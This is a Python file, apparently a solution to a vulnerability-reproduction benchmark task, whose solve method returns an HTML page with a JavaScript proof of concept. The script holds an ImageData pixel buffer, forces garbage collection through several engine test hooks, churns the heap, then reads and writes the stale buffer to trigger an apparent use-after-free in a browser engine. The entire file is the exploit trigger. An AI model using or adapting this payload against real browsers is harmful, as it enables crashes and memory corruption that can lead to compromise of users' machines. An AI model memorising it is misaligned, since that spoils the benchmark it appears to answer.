import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = src_path

        html = (
            "<!doctype html><meta charset=utf-8><body><script>"
            "var u;"
            "(function(){"
            "var img=null;"
            "try{img=new ImageData(512,512);}catch(e){"
            "try{var c=document.createElement('canvas');c.width=512;c.height=512;"
            "var x=c.getContext('2d');x.fillRect(0,0,512,512);img=x.getImageData(0,0,512,512);}catch(e2){}"
            "}"
            "if(img)u=img.data;"
            "})();"
            "function maybe_gc(){"
            "try{if(typeof gc==='function')gc();}catch(e){}"
            "try{if(window&&typeof window.gc==='function')window.gc();}catch(e){}"
            "try{if(window&&window.internals&&typeof internals.collectGarbage==='function')internals.collectGarbage();}catch(e){}"
            "try{if(window&&window.testRunner&&typeof testRunner.gc==='function')testRunner.gc();}catch(e){}"
            "}"
            "function churn(){"
            "for(var r=0;r<8;r++){"
            "var a=[];"
            "for(var i=0;i<256;i++){"
            "a.push(new ArrayBuffer(32768));"
            "if((i&7)===0)a=[];"
            "}"
            "}"
            "for(var j=0;j<20000;j++){"
            "var o={a:j,b:j+1,c:j+2,d:j+3};"
            "}"
            "}"
            "setTimeout(function(){"
            "if(!u)return;"
            "maybe_gc();"
            "churn();"
            "maybe_gc();"
            "try{u[0]=123;}catch(e){}"
            "try{var s=0;for(var k=0;k<4096;k++)s=(s+(u[k]|0))|0;u[1]=s&255;}catch(e){}"
            "},0);"
            "</script>"
        )
        return html.encode("utf-8")